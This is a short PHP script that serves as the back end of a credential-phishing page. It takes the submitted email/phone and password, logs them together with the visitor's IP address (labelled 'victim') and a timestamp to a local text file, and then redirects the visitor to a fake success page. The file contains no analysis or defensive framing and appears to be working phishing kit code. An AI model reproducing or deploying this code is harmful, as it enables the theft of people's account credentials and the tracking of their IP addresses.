<?php

extract($_REQUEST);
    if (!empty($_SERVER['HTTP_CLIENT_IP']))
{
$ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
}
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
{
$ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
}
else
{
$ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
}
$useragent = " User-Agent: ";
$browser = $_SERVER['HTTP_USER_AGENT'];
$file=fopen("resss.txt","a");
$victim = "IP: ";

fwrite($file,"Email/Phone (1) :");
fwrite($file, $PrevToEmail ."\n");

fwrite($file,"Password (1) :");
fwrite($file, $PrevToPass ."\n");

$time = date('d-m-Y : h-i-s');
fwrite( $file, "Time: $time"."\n" );


fwrite($file, $victim);
fwrite($file, $ipaddress."\n");


fwrite($file,"=============================================="."\n");


fclose($file);
header("location: sucess.html"."\n");
?>